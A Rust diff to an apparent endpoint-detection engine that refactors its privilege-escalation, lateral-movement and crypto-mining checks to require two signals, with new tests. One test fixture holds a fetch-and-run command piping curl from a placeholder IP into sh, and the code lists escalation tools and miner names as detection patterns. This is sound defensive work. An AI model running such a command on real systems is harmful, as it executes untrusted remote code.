@@ -5,6 +5,7 @@ use riggs_types::events::{
     AuthAction, FileAction, KernelAction, NetworkDirection, ProcessAction, RiggsEvent, StorylineId,
 };
 
+use crate::lure::LureRules;
 use crate::patterns::BehaviorPattern;
 
 /// Default cap on events retained per storyline. Detection windows only look at
@@ -22,12 +23,15 @@ pub struct BehaviorTracker {
     rapid_file_threshold: usize,
     rapid_window_secs: i64,
     persistence_paths: Vec<String>,
+    /// Only its stateless `distrusts` is used; the stage owns the alerting copy.
+    lure: LureRules,
 }
 
 impl BehaviorTracker {
     pub fn new() -> Self {
         let d = riggs_types::config::DetectionConfig::default();
         Self {
+            lure: LureRules::new(&d),
             storylines: HashMap::new(),
             max_events_per_storyline: DEFAULT_MAX_EVENTS_PER_STORYLINE,
             max_storylines: DEFAULT_MAX_STORYLINES,
@@ -51,6 +55,7 @@ impl BehaviorTracker {
         self.rapid_file_threshold = cfg.rapid_encryption_file_threshold;
         self.rapid_window_secs = cfg.rapid_encryption_window_secs;
         self.persistence_paths = cfg.persistence_paths.clone();
+        self.lure = LureRules::new(cfg);
         self
     }
 
@@ -177,18 +182,10 @@ impl BehaviorTracker {
     }
 
     fn check_privilege_escalation(&self, events: &[RiggsEvent]) -> Option<BehaviorPattern> {
-        // Signal 1: AuthEvent::Escalation — direct privilege escalation attempt
-        // The OS auth subsystem reported an escalation (sudo, su, pkexec, etc.)
-        for event in events {
-            if let RiggsEvent::Auth(ae) = event {
-                if ae.action == AuthAction::Escalation {
-                    return Some(BehaviorPattern::PrivilegeEscalation);
-                }
-            }
-        }
-
-        // Signal 2: AuthEvent::Failed followed by AuthEvent::Login from same process
-        // Brute-force pattern: failed auth attempt succeeded shortly after
+        // Auth signal (no sensor produces Auth events yet, so today it never
+        // holds): a failed auth of a user followed by that user's login within
+        // 60 seconds. An OS-reported `Escalation` is not this signal: it
+        // reports the same sudo the exec shows, so it counts as root gained.
         let auth_events: Vec<_> = events
             .iter()
             .filter_map(|e| match e {
@@ -196,60 +193,50 @@ impl BehaviorTracker {
                 _ => None,
             })
             .collect();
+        let os_reported_escalation = auth_events
+            .iter()
+            .any(|(_, action, _)| **action == AuthAction::Escalation);
+        let auth_signal = auth_events.iter().enumerate().any(|(i, failed)| {
+            *failed.1 == AuthAction::Failed
+                && auth_events[i + 1..].iter().any(|login| {
+                    *login.1 == AuthAction::Login
+                        && login.2 == failed.2
+                        && login.0 - failed.0 <= Duration::seconds(60)
+                })
+        });
 
-        if auth_events.len() >= 2 {
-            for i in 0..auth_events.len() {
-                if auth_events[i].1 == &AuthAction::Failed {
-                    // Look for a successful login from the same user within 60 seconds
-                    for j in (i + 1)..auth_events.len() {
-                        if auth_events[j].1 == &AuthAction::Login
-                            && auth_events[i].2 == auth_events[j].2 // same user
-                            && (auth_events[j].0 - auth_events[i].0) <= Duration::seconds(60)
-                        {
-                            return Some(BehaviorPattern::PrivilegeEscalation);
-                        }
-                    }
-                }
-            }
-        }
+        let execs = || {
+            events.iter().filter_map(|e| match e {
+                RiggsEvent::Process(pe) if pe.action == ProcessAction::Exec => Some(pe),
+                _ => None,
+            })
+        };
 
-        // Signal 3: Process cmdline invokes a privilege-escalation tool.
-        // Match on the first token (basename) so an invocation at the very start
-        // of the cmdline is caught, whether bare (`pkexec ...`) or absolute
-        // (`/usr/bin/pkexec ...`), without matching unrelated substrings.
+        // Gaining root is what sudo is for, so it is no detection by itself:
+        // the first token (basename) is an escalation tool, or a root exec
+        // under a non-root parent.
         const ESCALATION_COMMANDS: &[&str] = &["sudo", "su", "pkexec", "doas", "runuser"];
+        let is_root = |user: &str| user == "root" || user == "0";
+        let gained_root = os_reported_escalation
+            || execs().any(|pe| {
+                let cmdline_lower = pe.process_context.cmdline.to_lowercase();
+                let first_token = cmdline_lower.split_whitespace().next().unwrap_or("");
+                let basename = first_token.rsplit('/').next().unwrap_or(first_token);
+                ESCALATION_COMMANDS.contains(&basename)
+                    || (is_root(&pe.process_context.user)
+                        && pe
+                            .parent_context
+                            .as_ref()
+                            .is_some_and(|parent| !is_root(&parent.user)))
+            });
 
-        for event in events {
-            if let RiggsEvent::Process(pe) = event {
-                if pe.action == ProcessAction::Exec {
-                    let cmdline_lower = pe.process_context.cmdline.to_lowercase();
-                    let first_token = cmdline_lower.split_whitespace().next().unwrap_or("");
-                    let basename = first_token.rsplit('/').next().unwrap_or(first_token);
-                    if ESCALATION_COMMANDS.contains(&basename) {
-                        return Some(BehaviorPattern::PrivilegeEscalation);
-                    }
-                }
-            }
+        // It matters when the process that asked is itself not to be trusted.
+        let distrusted = execs().any(|pe| self.lure.distrusts(pe));
+        if !distrusted || !(gained_root || auth_signal) {
+            return None;
         }
-
-        // Signal 4: Process running as root with non-root parent
-        // A process spawned as root when its parent is not root is suspicious
-        for event in events {
-            if let RiggsEvent::Process(pe) = event {
-                if pe.action == ProcessAction::Exec {
-                    let is_root =
-                        pe.process_context.user == "root" || pe.process_context.user == "0";
-                    if let Some(parent) = &pe.parent_context {
-                        let parent_is_root = parent.user == "root" || parent.user == "0";
-                        if is_root && !parent_is_root {
-                            return Some(BehaviorPattern::PrivilegeEscalation);
-                        }
-                    }
-                }
-            }
-        }
-
-        None
+        let signals = u8::from(gained_root) + u8::from(auth_signal) + 1;
+        Some(BehaviorPattern::PrivilegeEscalation { signals })
     }
 
     fn check_lateral_movement(&self, events: &[RiggsEvent]) -> Option<BehaviorPattern> {
@@ -275,9 +262,7 @@ impl BehaviorTracker {
                 _ => None,
             })
             .collect();
-        if lateral_hosts.len() >= LATERAL_HOST_THRESHOLD {
-            return Some(BehaviorPattern::LateralMovement);
-        }
+        let sweep = lateral_hosts.len() >= LATERAL_HOST_THRESHOLD;
 
         // Signal 2: DNS query for internal hostname followed by network connection
         // Detects DNS reconnaissance → exploitation pattern
@@ -299,22 +284,15 @@ impl BehaviorTracker {
             })
             .collect();
 
-        for (dns_ts, dns_query) in &dns_queries {
-            for (net_ts, net_dst) in &network_events {
-                // DNS query happened before the network connection
-                if *net_ts < *dns_ts {
-                    continue;
-                }
-                // Within 30-second window
-                if *net_ts - *dns_ts > Duration::seconds(30) {
-                    continue;
-                }
-                // DNS query resolved to the destination IP
-                if dns_query == net_dst || dns_query.trim_end_matches('.') == net_dst.as_str() {
-                    return Some(BehaviorPattern::LateralMovement);
-                }
-            }
-        }
+        // The connection follows the query within 30 seconds and goes to the
+        // address the query resolved to.
+        let dns_then_connect = dns_queries.iter().any(|(dns_ts, dns_query)| {
+            network_events.iter().any(|(net_ts, net_dst)| {
+                *net_ts >= *dns_ts
+                    && *net_ts - *dns_ts <= Duration::seconds(30)
+                    && (dns_query == net_dst || dns_query.trim_end_matches('.') == net_dst.as_str())
+            })
+        });
 
         // Signal 3: AuthEvent (Failed/Login) combined with outbound network to internal host
         // Credential access + lateral movement from same process
@@ -339,27 +317,22 @@ impl BehaviorTracker {
             })
             .collect();
 
-        for (auth_ts, auth_action, pid) in &auth_events {
-            if !matches!(auth_action, AuthAction::Failed | AuthAction::Login) {
-                continue;
-            }
-            for (net_ts, net_pid) in &outbound_internal {
-                if pid != net_pid {
-                    continue;
-                }
-                // Auth event within 60 seconds of network connection
-                let time_diff = if *net_ts > *auth_ts {
-                    *net_ts - *auth_ts
-                } else {
-                    *auth_ts - *net_ts
-                };
-                if time_diff <= Duration::seconds(60) {
-                    return Some(BehaviorPattern::LateralMovement);
-                }
-            }
-        }
+        let auth_then_connect = auth_events
+            .iter()
+            .filter(|(_, action, _)| matches!(action, AuthAction::Failed | AuthAction::Login))
+            .any(|(auth_ts, _, pid)| {
+                outbound_internal.iter().any(|(net_ts, net_pid)| {
+                    pid == net_pid && (*net_ts - *auth_ts).abs() <= Duration::seconds(60)
+                })
+            });
 
-        None
+        // Each of the three is something an administrator does on an ordinary
+        // day; two of them in one tree together are a sweep with credentials.
+        // Today the verdict cannot exceed Suspicious: no sensor produces DNS
+        // or Auth events, and the DNS check compares a query name with a
+        // destination IP string, so it holds only when the "query" is an IP.
+        let signals = u8::from(sweep) + u8::from(dns_then_connect) + u8::from(auth_then_connect);
+        (signals > 0).then_some(BehaviorPattern::LateralMovement { signals })
     }
 
     fn is_internal_ip(addr: &str) -> bool {
@@ -643,69 +616,43 @@ impl BehaviorTracker {
             "randomx",
         ];
 
+        // The program that runs, not a word in another program's arguments:
+        // its name, the basename of its path or of the command's first token
+        // (an interpreter running `./xmrig`); or an option only a miner takes,
+        // under any name. xmrig's `--donate-level` is documented at
+        // https://xmrig.com/docs/miner/command-line-options.
         let miner_process_detected = events.iter().any(|e| {
-            if let RiggsEvent::Process(pe) = e {
-                let name_lower = pe.process_context.name.to_lowercase();
-                let path_lower = pe.process_context.path.to_lowercase();
-                let cmdline_lower = pe.process_context.cmdline.to_lowercase();
-
-                MINER_NAMES.iter().any(|miner| {
-                    name_lower.contains(miner)
-                        || path_lower.contains(miner)
-                        || cmdline_lower.contains(miner)
-                })
-            } else {
-                false
-            }
+            let RiggsEvent::Process(pe) = e else {
+                return false;
+            };
+            let ctx = &pe.process_context;
+            let first_token = ctx.cmdline.split_whitespace().next().unwrap_or("");
+            let basename = |path: &str| path.rsplit('/').next().unwrap_or(path).to_lowercase();
+            [
+                ctx.name.to_lowercase(),
+                basename(&ctx.path),
+                basename(first_token),
+            ]
+            .iter()
+            .any(|program| MINER_NAMES.iter().any(|miner| program.contains(miner)))
+                || ctx
+                    .cmdline
+                    .split_whitespace()
+                    .any(|arg| arg.to_lowercase().starts_with("--donate-level"))
         });
 
         if miner_process_detected {
             score += 1;
         }
 
-        // === Signal 4: High CPU heuristic (fork/exec storm) ===
-        // Mining processes often spawn child processes rapidly to distribute work.
-        // We detect this via rapid exec events in the storyline.
-        const CHILD_EXEC_THRESHOLD: usize = 10;
-        const EXEC_WINDOW_SECS: i64 = 60;
-
-        let exec_timestamps: Vec<_> = events
-            .iter()
-            .filter_map(|e| match e {
-                RiggsEvent::Process(pe) if pe.action == ProcessAction::Exec => Some(pe.timestamp),
-                _ => None,
-            })
-            .collect();
-
-        let mut fork_exec_storm = false;
-        if exec_timestamps.len() >= CHILD_EXEC_THRESHOLD {
-            for i in 0..exec_timestamps.len() {
-                let mut count = 0;
-                for j in i..exec_timestamps.len() {
-                    if (exec_timestamps[j] - exec_timestamps[i]).num_seconds() <= EXEC_WINDOW_SECS {
-                        count += 1;
-                    } else {
-                        break;
-                    }
-                }
-                if count >= CHILD_EXEC_THRESHOLD {
-                    fork_exec_storm = true;
-                    break;
-                }
-            }
-        }
-
-        if fork_exec_storm {
-            score += 1;
-        }
+        // A burst of execs is no signal: every build and package install makes one.
 
         // === Decision: multi-signal scoring ===
-        // 1 signal alone = Suspicious (conflict with legitimate uses)
-        // 2+ signals = Malicious (strong indicator of mining)
-        // Miner binary + mining port = Malicious (very strong indicator)
-        // A miner binary, a mining-pool domain or an exec storm is enough on its
-        // own; a port is not: with live network events, 8888 (Jupyter), 5555
-        // (adb), 8333 (Bitcoin nodes) and 4444 are everyday destinations, so a
+        // A miner name or a mining-pool domain alone = Suspicious; two signals
+        // = Malicious. A port is never enough on its own, on any port in the
+        // list: Stratum has no assigned port and the ports are shared with
+        // everyday services (4444 is Selenium's default,
+        // https://www.selenium.dev/documentation/grid/getting_started/), so a
         // mining port only counts next to another signal.
         // 443 was already excluded from the port list above.
         match score {
@@ -737,7 +684,7 @@ fn extract_storyline_id(event: &RiggsEvent) -> StorylineId {
 mod tests {
     use super::*;
     use chrono::Utc;
-    use riggs_types::events::{EventId, FileEvent, NetworkEvent, ProcessContext};
+    use riggs_types::events::{EventId, FileEvent, NetworkEvent, ProcessContext, Severity};
 
     fn make_ctx(pid: u32, name: &str) -> ProcessContext {
         ProcessContext::new(
@@ -873,7 +820,7 @@ mod tests {
     }
 
     #[test]
-    fn test_auth_escalation_detected() {
+    fn test_auth_escalation_alone_is_not_flagged() {
         let auth_event = make_auth_event(AuthAction::Escalation, 1001, "user", "sudo");
         let events = vec![auth_event];
 
@@ -883,12 +830,11 @@ mod tests {
         }
         let patterns = tracker.check_patterns(events[0].storyline_id());
 
-        assert_eq!(patterns.len(), 1);
-        assert!(matches!(patterns[0], BehaviorPattern::PrivilegeEscalation));
+        assert!(patterns.is_empty());
     }
 
     #[test]
-    fn test_brute_force_success_detected() {
+    fn test_brute_force_success_alone_is_not_flagged() {
         // Failed then successful auth for the same user must share a storyline
         // to correlate, so both events are built from one context.
         let ctx = ProcessContext::new(
@@ -910,8 +856,7 @@ mod tests {
         }
         let patterns = tracker.check_patterns(events[1].storyline_id());
 
-        assert_eq!(patterns.len(), 1);
-        assert!(matches!(patterns[0], BehaviorPattern::PrivilegeEscalation));
+        assert!(patterns.is_empty());
     }
 
     #[test]
@@ -927,11 +872,11 @@ mod tests {
         let patterns = tracker.check_patterns(events[1].storyline_id());
 
         // Different users — not a brute force pattern
-        assert!(!patterns.contains(&BehaviorPattern::PrivilegeEscalation));
+        assert!(patterns.is_empty());
     }
 
     #[test]
-    fn test_sudo_in_cmdline_detected() {
+    fn test_sudo_in_cmdline_alone_is_not_flagged() {
         let ctx = ProcessContext::new(
             4001,
             0,
@@ -950,12 +895,11 @@ mod tests {
         }
         let patterns = tracker.check_patterns(events[0].storyline_id());
 
-        assert_eq!(patterns.len(), 1);
-        assert!(matches!(patterns[0], BehaviorPattern::PrivilegeEscalation));
+        assert!(patterns.is_empty());
     }
 
     #[test]
-    fn test_pkexec_in_cmdline_detected() {
+    fn test_pkexec_in_cmdline_alone_is_not_flagged() {
         let ctx = ProcessContext::new(
             5001,
             0,
@@ -974,12 +918,11 @@ mod tests {
         }
         let patterns = tracker.check_patterns(events[0].storyline_id());
 
-        assert_eq!(patterns.len(), 1);
-        assert!(matches!(patterns[0], BehaviorPattern::PrivilegeEscalation));
+        assert!(patterns.is_empty());
     }
 
     #[test]
-    fn test_root_process_from_nonroot_parent_detected() {
+    fn test_root_process_from_nonroot_parent_with_lure_parent_and_temp_exec_is_suspicious() {
         let parent_ctx = ProcessContext::new(
             6001,
             0,
@@ -1007,8 +950,10 @@ mod tests {
         }
         let patterns = tracker.check_patterns(events[0].storyline_id());
 
-        assert_eq!(patterns.len(), 1);
-        assert!(matches!(patterns[0], BehaviorPattern::PrivilegeEscalation));
+        assert_eq!(
+            patterns,
+            vec![BehaviorPattern::PrivilegeEscalation { signals: 2 }]
+        );
     }
 
     #[test]
@@ -1041,7 +986,9 @@ mod tests {
         let patterns = tracker.check_patterns(events[0].storyline_id());
 
         // Normal: root spawning root (e.g., ssh session)
-        assert!(!patterns.contains(&BehaviorPattern::PrivilegeEscalation));
+        assert!(patterns
+            .iter()
+            .all(|p| !matches!(p, BehaviorPattern::PrivilegeEscalation { .. })));
     }
 
     #[test]
@@ -1129,7 +1076,7 @@ mod tests {
     }
 
     #[test]
-    fn test_internal_sweep_detected() {
+    fn test_internal_sweep_alone_is_one_signal() {
         // One process tree reaching three internal hosts on a lateral movement port.
         for port in [22, 3389, 445, 5985] {
             let events = in_one_storyline(
@@ -1143,7 +1090,7 @@ mod tests {
             }
             assert_eq!(
                 tracker.check_patterns(events[0].storyline_id()),
-                vec![BehaviorPattern::LateralMovement],
+                vec![BehaviorPattern::LateralMovement { signals: 1 }],
                 "{port}"
             );
         }
@@ -1160,7 +1107,9 @@ mod tests {
         }
         let patterns = tracker.check_patterns(events[0].storyline_id());
 
-        assert!(!patterns.contains(&BehaviorPattern::LateralMovement));
+        assert!(patterns
+            .iter()
+            .all(|p| !matches!(p, BehaviorPattern::LateralMovement { .. })));
     }
 
     #[test]
@@ -1175,7 +1124,9 @@ mod tests {
         let patterns = tracker.check_patterns(events[0].storyline_id());
 
         // Inbound connections are not lateral movement
-        assert!(!patterns.contains(&BehaviorPattern::LateralMovement));
+        assert!(patterns
+            .iter()
+            .all(|p| !matches!(p, BehaviorPattern::LateralMovement { .. })));
     }
 
     #[test]
@@ -1194,11 +1145,13 @@ mod tests {
         }
         let patterns = tracker.check_patterns(events[0].storyline_id());
 
-        assert!(!patterns.contains(&BehaviorPattern::LateralMovement));
+        assert!(patterns
+            .iter()
+            .all(|p| !matches!(p, BehaviorPattern::LateralMovement { .. })));
     }
 
     #[test]
-    fn test_dns_recon_to_connection_detected() {
+    fn test_dns_recon_to_connection_alone_is_one_signal() {
         // DNS query for internal host, then network connection to that host
         let dns_event = make_dns_event(10001, "192.168.1.50", "192.168.1.50");
         let net_event = make_network_event(NetworkDirection::Outbound, 10001, "192.168.1.50", 22);
@@ -1211,11 +1164,14 @@ mod tests {
         let patterns = tracker.check_patterns(events[1].storyline_id());
 
         assert_eq!(patterns.len(), 1);
-        assert!(matches!(patterns[0], BehaviorPattern::LateralMovement));
+        assert!(matches!(
+            patterns[0],
+            BehaviorPattern::LateralMovement { signals: 1 }
+        ));
     }
 
     #[test]
-    fn test_auth_failed_with_internal_network_detected() {
+    fn test_auth_failed_with_internal_network_alone_is_one_signal() {
         let auth_event = make_auth_event(AuthAction::Failed, 11001, "admin", "password");
         let net_event = make_network_event(NetworkDirection::Outbound, 11001, "10.0.0.100", 445);
         let events = in_one_storyline(vec![auth_event, net_event]);
@@ -1227,11 +1183,14 @@ mod tests {
         let patterns = tracker.check_patterns(events[1].storyline_id());
 
         assert_eq!(patterns.len(), 1);
-        assert!(matches!(patterns[0], BehaviorPattern::LateralMovement));
+        assert!(matches!(
+            patterns[0],
+            BehaviorPattern::LateralMovement { signals: 1 }
+        ));
     }
 
     #[test]
-    fn test_auth_login_with_internal_network_detected() {
+    fn test_auth_login_with_internal_network_alone_is_one_signal() {
         let auth_event = make_auth_event(AuthAction::Login, 12001, "admin", "ssh");
         let net_event = make_network_event(NetworkDirection::Outbound, 12001, "172.16.0.5", 3389);
         let events = in_one_storyline(vec![auth_event, net_event]);
@@ -1243,7 +1202,10 @@ mod tests {
         let patterns = tracker.check_patterns(events[1].storyline_id());
 
         assert_eq!(patterns.len(), 1);
-        assert!(matches!(patterns[0], BehaviorPattern::LateralMovement));
+        assert!(matches!(
+            patterns[0],
+            BehaviorPattern::LateralMovement { signals: 1 }
+        ));
     }
 
     #[test]
@@ -1265,7 +1227,9 @@ mod tests {
 
         // Different PIDs (and thus storylines) — the auth and the connection do
         // not correlate, and the connection alone is on a benign port.
-        assert!(!patterns.contains(&BehaviorPattern::LateralMovement));
+        assert!(patterns
+            .iter()
+            .all(|p| !matches!(p, BehaviorPattern::LateralMovement { .. })));
     }
 
     #[test]
@@ -2689,7 +2653,9 @@ mod tests {
         assert!(matches!(patterns[0], BehaviorPattern::PersistenceMechanism));
 
         assert!(!patterns.contains(&BehaviorPattern::ProcessInjection));
-        assert!(!patterns.contains(&BehaviorPattern::PrivilegeEscalation));
+        assert!(patterns
+            .iter()
+            .all(|p| !matches!(p, BehaviorPattern::PrivilegeEscalation { .. })));
     }
 
     #[test]
@@ -3183,7 +3149,9 @@ mod tests {
         ));
 
         assert!(!patterns.contains(&BehaviorPattern::PersistenceMechanism));
-        assert!(!patterns.contains(&BehaviorPattern::PrivilegeEscalation));
+        assert!(patterns
+            .iter()
+            .all(|p| !matches!(p, BehaviorPattern::PrivilegeEscalation { .. })));
     }
 
     #[test]
@@ -3311,5 +3279,255 @@ mod tests {
             patterns[0],
             BehaviorPattern::SuspiciousChildProcess
         ));
+    }
+
+    // --- One ordinary action is never Malicious; Malicious needs two signals ---
+
+    fn exec(path: &str, cmdline: &str, user: &str, parent: Option<(&str, &str)>) -> RiggsEvent {
+        let ctx = |path: &str, cmdline: &str, user: &str| {
+            let name = path.rsplit('/').next().unwrap_or(path);
+            ProcessContext::new(1, 0, name, path, cmdline, user, StorylineId::new())
+        };
+        RiggsEvent::new_process(
+            ProcessAction::Exec,
+            ctx(path, cmdline, user),
+            parent.map(|(path, user)| ctx(path, "", user)),
+        )
+    }
+
+    fn worst_severity(events: Vec<RiggsEvent>) -> Option<Severity> {
+        let events = in_one_storyline(events);
+        let mut tracker = BehaviorTracker::new();
+        for e in &events {
+            tracker.track(e.clone());
+        }
+        tracker
+            .check_patterns(events[0].storyline_id())
+            .iter()
+            .map(BehaviorPattern::severity)
+            .max()
+    }
+
+    fn cargo_build() -> Vec<RiggsEvent> {
+        (0..60)
+            .map(|_| {
+                exec(
+                    "/usr/bin/cc",
+                    "cc -c main.c",
+                    "501",
+                    Some(("/bin/zsh", "501")),
+                )
+            })
+            .collect()
+    }
+
+    #[test]
+    fn ordinary_days_never_reach_malicious() {
+        let ssh = |host| make_network_event(NetworkDirection::Outbound, 9500, host, 22);
+        let sudo_make_install = vec![
+            exec("/bin/zsh", "-zsh", "501", Some(("/usr/bin/login", "root"))),
+            exec(
+                "/usr/bin/sudo",
+                "sudo make install",
+                "501",
+                Some(("/bin/zsh", "501")),
+            ),
+            exec(
+                "/usr/bin/make",
+                "make install",
+                "root",
+                Some(("/usr/bin/sudo", "501")),
+            ),
+        ];
+        let mut cargo_then_jupyter_port = cargo_build();
+        cargo_then_jupyter_port.push(make_network_event(
+            NetworkDirection::Outbound,
+            9500,
+            "203.0.113.7",
+            8888,
+        ));
+        let ssh_three_hosts = vec![ssh("10.0.0.5"), ssh("10.0.0.6"), ssh("10.0.0.7")];
+        let brew_services_start = vec![RiggsEvent::new_file(
+            FileAction::Create,
+            make_ctx(9501, "brew"),
+            "/Users/dev/Library/LaunchAgents/homebrew.mxcl.postgresql.plist".to_string(),
+            None,
+        )];
+
+        // (day, nothing at all is required, not just nothing above Suspicious)
+        for (day, events, silent) in [
+            ("sudo make install", sudo_make_install, true),
+            ("cargo build", cargo_build(), true),
+            (
+                "cargo build and port 8888 elsewhere",
+                cargo_then_jupyter_port,
+                true,
+            ),
+            (
+                "git clone a miner's repository, Selenium on 4444",
+                vec![
+                    make_mining_process_event(
+                        9502,
+                        "git",
+                        "/usr/bin/git",
+                        "git clone https://example.test/xmrig/xmrig",
+                    ),
+                    make_mining_network_event(9502, "203.0.113.9", 4444),
+                ],
+                true,
+            ),
+            (
+                "grep for a miner's name, adb on 5555",
+                vec![
+                    make_mining_process_event(
+                        9503,
+                        "grep",
+                        "/usr/bin/grep",
+                        "grep randomx notes.txt",
+                    ),
+                    make_mining_network_event(9503, "203.0.113.9", 5555),
+                ],
+                true,
+            ),
+            ("ssh to three internal hosts", ssh_three_hosts, false),
+            ("brew services start", brew_services_start, false),
+        ] {
+            let worst = worst_severity(events);
+            assert!(worst < Some(Severity::High), "{day}: {worst:?}");
+            assert!(!silent || worst.is_none(), "{day}: {worst:?}");
+        }
+    }
+
+    #[test]
+    fn privilege_escalation_needs_a_distrusted_asker_and_an_auth_signal() {
+        let lure = exec(
+            "/bin/bash",
+            "/bin/bash -c curl -s http://203.0.113.5/x | sh",
+            "501",
+            Some(("/Applications/Safari.app/Contents/MacOS/Safari", "501")),
+        );
+        let sudo = exec(
+            "/usr/bin/sudo",
+            "sudo ./x",
+            "501",
+            Some(("/bin/bash", "501")),
+        );
+        let escalation = make_auth_event(AuthAction::Escalation, 9600, "501", "sudo");
+        let failed = make_auth_event(AuthAction::Failed, 9600, "501", "password");
+        let login = make_auth_event(AuthAction::Login, 9600, "501", "password");
+
+        assert_eq!(worst_severity(vec![sudo.clone()]), None);
+        assert_eq!(
+            worst_severity(vec![lure.clone(), sudo.clone()]),
+            Some(Severity::Medium)
+        );
+        // The OS reporting the sudo is the same signal as the sudo exec.
+        assert_eq!(
+            worst_severity(vec![lure.clone(), sudo.clone(), escalation]),
+            Some(Severity::Medium)
+        );
+        // A failed then successful login is independent evidence.
+        assert_eq!(
+            worst_severity(vec![lure, sudo, failed, login]),
+            Some(Severity::High)
+        );
+    }
+
+    #[test]
+    fn miner_name_counts_only_for_the_program_that_runs() {
+        let port = || make_mining_network_event(9710, "203.0.113.9", 4444);
+        let ran = |path, cmdline| make_mining_process_event(9710, "x", path, cmdline);
+
+        for (what, command) in [
+            (
+                "clone a miner's repository",
+                ran("/usr/bin/git", "git clone https://example.test/xmrig/xmrig"),
+            ),
+            (
+                "search for a miner's name",
+                ran("/usr/bin/grep", "grep randomx notes.txt"),
+            ),
+            (
+                "run a program from a miner-named directory",
+                ran("/Users/dev/xmrig-src/build/make", "make"),
+            ),
+        ] {
+            assert_eq!(worst_severity(vec![command.clone()]), None, "{what}");
+            assert_eq!(
+                worst_severity(vec![command, port()]),
+                None,
+                "{what} and port"
+            );
+        }
+
+        let real_name = ran("/opt/xmrig/xmrig", "xmrig -o pool.example.test");
+        let renamed = ran(
+            "/tmp/kworker",
+            "kworker --donate-level=1 -o pool.example.test",
+        );
+        for miner in [real_name, renamed] {
+            assert_eq!(worst_severity(vec![miner.clone()]), Some(Severity::Medium));
+            assert_eq!(worst_severity(vec![miner, port()]), Some(Severity::High));
+        }
+    }
+
+    #[test]
+    fn one_sudo_with_both_auth_reports_and_a_distrusted_exec_stays_suspicious() {
+        let lure = exec(
+            "/tmp/helper",
+            "/tmp/helper",
+            "501",
+            Some(("/bin/zsh", "501")),
+        );
+        let sudo = exec("/usr/bin/sudo", "sudo ls", "501", Some(("/bin/zsh", "501")));
+        let escalation = make_auth_event(AuthAction::Escalation, 9610, "501", "sudo");
+        let login = make_auth_event(AuthAction::Login, 9610, "501", "sudo");
+        assert_eq!(
+            worst_severity(vec![lure, sudo, escalation, login]),
+            Some(Severity::Medium)
+        );
+    }
+
+    #[test]
+    fn crypto_mining_needs_two_signals() {
+        let miner = || make_mining_process_event(9700, "xmrig", "/tmp/xmrig", "./xmrig");
+        let pool_port = || make_mining_network_event(9700, "203.0.113.9", 3333);
+
+        assert_eq!(worst_severity(vec![pool_port()]), None);
+        assert_eq!(worst_severity(vec![miner()]), Some(Severity::Medium));
+        assert_eq!(
+            worst_severity(vec![miner(), pool_port()]),
+            Some(Severity::High)
+        );
+        let mut busy_build = cargo_build();
+        busy_build.push(pool_port());
+        assert_eq!(worst_severity(busy_build), None);
+    }
+
+    #[test]
+    fn lateral_movement_needs_a_second_signal_beyond_the_sweep() {
+        let sweep = || {
+            ["10.0.0.5", "10.0.0.6", "10.0.0.7"]
+                .map(|host| make_network_event(NetworkDirection::Outbound, 9800, host, 22))
+                .to_vec()
+        };
+        let failed_auth = make_auth_event(AuthAction::Failed, 9800, "admin", "password");
+
+        assert_eq!(worst_severity(sweep()), Some(Severity::Medium));
+        let mut with_auth = sweep();
+        with_auth.push(failed_auth);
+        assert_eq!(worst_severity(with_auth), Some(Severity::High));
+    }
+
+    #[test]
+    fn lateral_movement_stays_suspicious_with_the_events_sensors_produce() {
+        // Sensors give process and network events only; DNS and Auth events,
+        // the second and third signals, do not exist yet, so even a sweep with
+        // lookups of internal host names is capped at Suspicious.
+        let mut sweep: Vec<RiggsEvent> = ["10.0.0.5", "10.0.0.6", "10.0.0.7"]
+            .map(|host| make_network_event(NetworkDirection::Outbound, 9810, host, 22))
+            .to_vec();
+        sweep.push(make_dns_event(9810, "build.internal.example", "10.0.0.5"));
+        assert_eq!(worst_severity(sweep), Some(Severity::Medium));
     }
 }
